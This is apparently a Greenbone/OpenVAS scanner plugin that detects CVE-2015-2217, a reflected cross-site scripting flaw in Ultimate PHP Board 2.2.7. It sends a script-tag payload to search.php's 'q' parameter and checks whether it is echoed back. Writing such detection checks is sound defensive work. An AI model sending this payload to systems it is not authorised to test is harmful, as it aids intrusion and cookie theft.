if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805352" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2015-2217" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-03-14 13:06:08 +0530 (Sat, 14 Mar 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "PHP Board Multiple XSS Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with PHP Board
  and is prone to multiple xss vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Flaws are due to the 'q' parameter in
  search.php script and 'avatar' parameter in profile.php script not validated
  before returning it to users." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "PHP Board version 2.2.7." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/130684/Ultimate-PHP-Board-UPB-2.2.7-Cross-Site-Scripting.html" );
	script_xref( name: "URL", value: "https://github.com/PHP-Outburst/myUPB/pull/27" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/upb", "/chat/upb", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/";
	rcvRes = http_get_cache( item: url, port: http_port );
	if(rcvRes && IsMatchRegexp( rcvRes, "Powered by.*UPB" )){
		url1 = url + "search.php?q='><script>alert(document.cookie)</script>";
		if(http_vuln_check( port: http_port, url: url1, check_header: TRUE, pattern: "<script>alert\\(document\\.cookie\\)</script>" )){
			report = http_report_vuln_url( port: http_port, url: url1 );
			security_message( port: http_port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

